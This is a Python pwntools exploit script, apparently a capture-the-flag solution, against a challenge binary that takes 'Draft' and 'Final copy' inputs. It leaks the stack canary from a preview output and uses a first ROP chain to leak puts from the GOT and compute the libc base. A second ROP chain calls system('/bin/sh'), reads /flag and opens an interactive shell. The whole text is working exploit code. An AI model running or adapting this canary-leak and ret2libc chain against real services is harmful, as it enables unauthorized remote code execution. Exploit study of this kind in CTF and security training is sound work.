from pwn import *

context.binary = elf = ELF("./main", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote(args.HOST or "localhost", int(args.PORT or 1353))

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

io.sendafter(b"Draft: ", b"A" * 64)
io.recvuntil(b"Committee preview:\n")
preview = io.recvn(80)
canary = u64(preview[72:80])

stage_one = flat(
    b"A" * 72,
    canary,
    b"B" * 8,
    ret,
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    ret,
    elf.sym.main,
)
io.sendafter(b"Final copy: ", stage_one)
io.recvuntil(b"Filed.\n")
libc.address = u64(io.recvn(6).ljust(8, b"\0")) - libc.sym.puts
io.recvuntil(b"\n")

io.sendafter(b"Draft: ", b"A" * 64)
io.recvuntil(b"Committee preview:\n")
io.recvn(80)

stage_two = flat(
    b"A" * 72,
    canary,
    b"B" * 8,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh\0")),
    libc.sym.system,
)
io.sendafter(b"Final copy: ", stage_two)
io.recvuntil(b"Filed.\n")
io.sendline(b"cat /flag")
io.interactive()
